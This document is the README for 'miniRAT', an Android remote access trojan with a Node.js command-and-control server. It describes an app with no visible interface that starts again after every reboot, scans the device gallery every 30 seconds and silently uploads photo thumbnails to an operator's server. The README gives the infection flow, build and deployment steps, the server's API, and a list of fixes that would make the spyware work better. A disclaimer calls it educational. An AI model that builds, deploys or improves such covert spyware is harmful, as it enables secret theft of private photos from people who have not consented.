# miniRAT

> A minimal Android Remote Access Trojan (RAT) for educational and security research purposes. This project demonstrates how a covert Android app can silently exfiltrate device gallery thumbnails to a remote command-and-control (C2) server.

---

## Table of Contents

- [Overview](#overview)
- [Features](#features)
- [Project Structure](#project-structure)
- [How It Works](#how-it-works)
- [Prerequisites](#prerequisites)
- [Setup & Installation](#setup--installation)
- [Configuration](#configuration)
- [Running the C2 Server](#running-the-c2-server)
- [Building the Android APK](#building-the-android-apk)
- [API Reference](#api-reference)
- [Permissions](#permissions)
- [Known Limitations](#known-limitations)
- [Disclaimer](#disclaimer)

---

## Overview

miniRAT is a two-component system:

| Component | Technology | Description |
|---|---|---|
| **Android Client** | Java, Android SDK (API 21–36) | A fully stealth Android app that runs invisibly on target devices, periodically scanning the device gallery and uploading thumbnail previews to a remote server. |
| **C2 Server** | Node.js, Express.js | A lightweight command-and-control server that receives uploaded thumbnails, stores them on disk, and serves a web-based gallery viewer for the operator. |

The project is intentionally minimal — it focuses on a single RAT capability (gallery thumbnail exfiltration) to demonstrate the core patterns of Android RAT design: stealth entry, background persistence, data exfiltration, and remote data viewing.

---

## Features

### Android Client
- **Zero-UI Launch** — The app launches from the app drawer but shows absolutely no interface to the user. It appears to "do nothing" and instantly vanishes.
- **Background Service** — A persistent background service (`ParasiteService`) runs continuously using `START_STICKY`, meaning the OS will attempt to restart it if killed.
- **Boot Persistence** — A `BroadcastReceiver` automatically restarts the service after device reboot, covering standard boot events and HTC quick-boot variants.
- **Gallery Scanning** — Queries the Android `MediaStore` for all JPEG images and MP4 videos on external storage.
- **Thumbnail Generation** — Creates efficient 128×128 pixel thumbnails from gallery files, maintaining aspect ratio, and compresses to JPEG at 70% quality.
- **Data Exfiltration** — Uploads Base64-encoded thumbnails to the C2 server via HTTP POST with JSON payloads.
- **Stealth Notification Channel** — Creates a silent, minimum-importance notification channel for future foreground service use.
- **Periodic Execution** — Runs the full scan-and-upload cycle every 30 seconds using a `Handler`-based periodic task.

### C2 Server
- **Thumbnail Receiver** — Accepts Base64-encoded thumbnails via POST, decodes them, and saves as JPEG files.
- **Metadata Tracking** — Stores JSON metadata alongside each thumbnail recording the original filename and upload timestamp.
- **Gallery Dashboard** — Serves an inline HTML/CSS/JS gallery viewer at the root URL with a responsive grid layout and auto-refresh every 30 seconds.
- **Thumbnail Listing API** — Returns all stored thumbnails sorted by upload time (newest first).
- **Full-Size File Serving** — Optional endpoint to serve full-resolution files from the uploads directory.
- **CORS Enabled** — Accepts requests from any origin for cross-origin development/testing.

---

## Project Structure

```
miniRAT/
├── app/
│   ├── build.gradle.kts              # Android build config, dependencies, BuildConfig injection
│   ├── local.properties              # DOMAIN_URL for C2 server (not committed to git)
│   ├── proguard-rules.pro            # ProGuard rules (minification disabled)
│   └── src/
│       └── main/
│           ├── AndroidManifest.xml    # Permissions, components, intent filters
│           └── java/com/app/minirat/
│               ├── HiddenActivity.java   # Stealth launcher — starts service, finishes immediately
│               ├── MainActivity.java     # Placeholder decoy — finishes immediately, unused
│               ├── Service.java          # ParasiteService — core RAT payload (gallery exfiltration)
│               └── BootReceiver.java     # BroadcastReceiver — persistence across reboots
├── server.js                         # Node.js C2 server (Express)
├── build.gradle.kts                  # Root Gradle build file
├── settings.gradle.kts               # Gradle settings
├── gradle.properties                 # Gradle JVM configuration
├── gradlew / gradlew.bat             # Gradle wrapper scripts
└── .claude/                          # Project documentation (this folder)
    ├── README.md                     # This file
    ├── ARCHITECTURE.md               # System architecture deep-dive
    ├── ANALYSIS.md                   # Code analysis, bugs, security review
    └── CONTEXT.md                    # Project context, conventions, developer guide
```

---

## How It Works

### Infection Flow

```
1. User installs APK (sideloaded)
2. User taps app icon in app drawer
3. HiddenActivity launches (zero UI)
   ├── Sets fullscreen invisible window flags
   ├── Starts ParasiteService
   └── Calls finish() — activity disappears instantly
4. ParasiteService begins background loop (every 30s):
   ├── Queries MediaStore for all JPEG/MP4 files
   ├── For each file:
   │   ├── Decodes bitmap from file path
   │   ├── Scales to 128×128 thumbnail
   │   ├── Encodes as Base64 JPEG
   │   └── POST to {DOMAIN_URL}/upload/thumbnail
   └── Schedules next cycle in 30 seconds
5. On device reboot:
   └── BootReceiver fires → restarts ParasiteService
```

### Server Flow

```
1. Server receives POST /api/upload/thumbnail
   ├── Decodes Base64 thumbnail data
   ├── Saves as {filename}_thumb.jpg in ./uploads/
   └── Saves {filename}.metadata.json with timestamp
2. Operator visits http://server:3000/
   └── Gallery viewer loads thumbnails from GET /api/thumbnails
       └── Displays in responsive grid, refreshes every 30s
```

---

## Prerequisites

### Android Client
- Android Studio (latest stable)
- JDK 11+
- Android SDK with API Level 36
- A physical Android device or emulator (API 21+)

### C2 Server
- Node.js 16+
- npm

---

## Setup & Installation

### 1. Clone the Repository

```bash
git clone https://github.com/Rhishavhere/miniRAT.git
cd miniRAT
```

### 2. Configure the C2 Domain

Edit `app/local.properties` (create if it doesn't exist):

```properties
DOMAIN_URL=https://your-server-domain.com
```

This URL is injected into `BuildConfig.DOMAIN_URL` at compile time. The Android client will POST thumbnails to `{DOMAIN_URL}/upload/thumbnail`.

### 3. Install Server Dependencies

```bash
npm install express cors multer
```

---

## Configuration

| Property | File | Description |
|---|---|---|
| `DOMAIN_URL` | `app/local.properties` | The C2 server URL the Android client uploads to |
| `SERVER_URL` | `Service.java` (via BuildConfig) | Reads `DOMAIN_URL` from BuildConfig at runtime |
| Port `3000` | `server.js` | The port the C2 server listens on |
| `30000` ms | `Service.java` L70, L73 | The interval between scan-and-upload cycles |
| `128×128` px | `Service.java` L166-167 | Thumbnail resolution |
| JPEG quality `70` | `Service.java` L183 | Thumbnail compression quality |

---

## Running the C2 Server

```bash
node server.js
```

Output:
```
RAT server running at http://localhost:3000
```

The gallery viewer is available at `http://localhost:3000/`. Thumbnails are stored in `./uploads/`.

---

## Building the Android APK

1. Open the project in Android Studio.
2. Ensure `local.properties` has the correct `DOMAIN_URL`.
3. Build → Build Bundle(s) / APK(s) → Build APK(s).
4. The APK will be at `app/build/outputs/apk/debug/app-debug.apk`.

---

## API Reference

### `POST /api/upload/thumbnail`

Upload a gallery thumbnail to the server.

**Request Body** (JSON):
```json
{
  "filename": "IMG_20240101_120000.jpg",
  "thumbnail": "<base64-encoded-jpeg-data>"
}
```

**Response** (200 OK):
```json
{
  "success": true,
  "message": "Thumbnail uploaded successfully",
  "filename": "IMG_20240101_120000.jpg",
  "thumbnailPath": "IMG_20240101_120000.jpg_thumb.jpg"
}
```

---

### `GET /api/thumbnails`

List all uploaded thumbnails, sorted newest first.

**Response** (200 OK):
```json
{
  "thumbnails": [
    {
      "name": "IMG_20240101_120000.jpg",
      "thumbnail": "IMG_20240101_120000.jpg_thumb.jpg",
      "uploadedAt": "2024-01-01T12:00:00.000Z"
    }
  ]
}
```

---

### `GET /api/fullsize/:filename`

Serve a full-size file from the uploads directory.

**Response**: Raw file data or `404 { "error": "File not found" }`.

---

### `GET /`

Serves the inline HTML gallery viewer dashboard.

---

## Permissions

The Android client requests the following permissions:

| Permission | Required | Usage |
|---|---|---|
| `INTERNET` | ✅ | Upload thumbnails to C2 server |
| `ACCESS_NETWORK_STATE` | ✅ | Check network connectivity |
| `READ_EXTERNAL_STORAGE` | ✅ | Access device gallery via MediaStore |
| `WRITE_EXTERNAL_STORAGE` | ❌ | Declared but unused in code |
| `WAKE_LOCK` | ❌ | Declared but unused in code |
| `RECEIVE_BOOT_COMPLETED` | ✅ | Restart service after device reboot |

---

## Known Limitations

1. **URL Path Mismatch** — The Android client POSTs to `/upload/thumbnail` but the server expects `/api/upload/thumbnail`. This will result in a 404 error. Either update the client to include `/api` prefix or adjust the server route.

2. **No Android 8+ Foreground Support** — `startForeground()` is commented out in `ParasiteService`. On Android 8+ (API 26+), background services must display a foreground notification or they will be killed. The boot receiver will also crash when calling `startService()` from background.

3. **No Runtime Permission Handling** — `READ_EXTERNAL_STORAGE` requires runtime permission on Android 6+ (API 23+). The app never requests it via `ActivityCompat.requestPermissions()`, so MediaStore queries will silently return empty results.

4. **No Deduplication** — Every 30-second cycle re-scans the entire gallery and re-uploads all thumbnails. There is no tracking of previously uploaded files.

5. **Memory Pressure** — Full-resolution bitmaps are loaded into memory before being scaled to thumbnails. Large images (e.g., 50MP photos) can cause `OutOfMemoryError`. Should use `BitmapFactory.Options.inSampleSize` for efficient downsampling.

6. **No Encryption** — Thumbnail data is transmitted as plain Base64 in JSON. While HTTPS provides transport encryption, the payload itself is unencrypted.

7. **JSON Injection** — Filenames are concatenated directly into JSON strings without escaping. Filenames with quotes or special characters will corrupt the JSON payload.

8. **Unused Compose Dependencies** — The build includes full Jetpack Compose dependencies and theme files, but the app is pure Java with no Compose UI.

---

## Disclaimer

> **⚠️ This project is for educational and authorized security research purposes only.**
>
> Unauthorized access to computer systems and data exfiltration is illegal under computer crime laws in most jurisdictions. This software must only be installed on devices you own or have explicit authorization to test. The authors assume no liability for misuse.
